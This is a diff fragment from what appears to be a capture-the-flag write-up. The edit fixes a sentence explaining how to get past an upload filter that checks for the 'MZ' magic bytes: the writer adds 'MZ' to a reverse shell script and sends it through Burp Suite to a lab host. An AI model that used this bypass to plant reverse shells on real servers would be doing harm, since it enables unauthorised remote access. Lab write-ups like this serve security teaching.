@@ -55,7 +55,7 @@ if ( strpos($magicbytes, '4D5A') === false )
 ```
 since 4D5A is decode as MZ
 we just have to add MZ to the beginning of the file we gonna upload  
-we upload burp suite and add MZ in a reverse shell script
+we upload to burp suite and add MZ in a reverse shell script
 ```console
 POST /upload.php HTTP/1.1
 Host: 192.168.195.33
